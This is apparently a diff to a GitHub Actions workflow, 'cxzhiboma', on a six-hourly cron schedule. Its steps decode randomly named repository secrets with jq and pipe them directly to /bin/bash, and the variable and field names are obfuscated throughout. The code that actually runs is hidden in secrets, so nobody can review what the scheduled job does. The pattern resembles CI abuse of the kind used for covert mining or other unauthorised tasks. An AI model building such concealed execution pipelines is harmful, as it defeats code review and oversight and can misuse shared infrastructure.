@@ -2,23 +2,22 @@ name: cxzhiboma
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 1/6 * * *'
-
-jobs:  # 3348
+    - cron: '1 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: cxzhiboma
         env:
-          eusk7: ${{ secrets.eusk7 }}
+          snv5502: ${{ secrets.snv5502 }}
         run: |
-          echo $eusk7 | jq -r .ir7181 | /bin/bash
-          echo $wheqf46 | jq -r .lrnby5743 | /bin/bash
-          echo $r07601 | jq -r .gnn8475 | /bin/bash
-          echo $tr31 | jq -r .vd11752 | /bin/bash
-          echo $hos8 | jq -r .ku8 | /bin/bash
-          echo $dhtdm92317 | jq -r .geps127 | /bin/bash
-          echo $qnj7 | jq -r .k83 | /bin/bash
+          echo $snv5502 | jq -r .g90 | /bin/bash
+          echo $rqe50 | jq -r .uurys4972 | /bin/bash
+          echo $jpy22 | jq -r .qo3 | /bin/bash
+          echo $umlm0668 | jq -r .gra8542 | /bin/bash
+          echo $erkf3 | jq -r .z3398 | /bin/bash
+          echo $c16 | jq -r .gf293 | /bin/bash
+          echo $ruhnf3 | jq -r .gx66835 | /bin/bash
+          echo $gpa80 | jq -r .dukod1 | /bin/bash
 
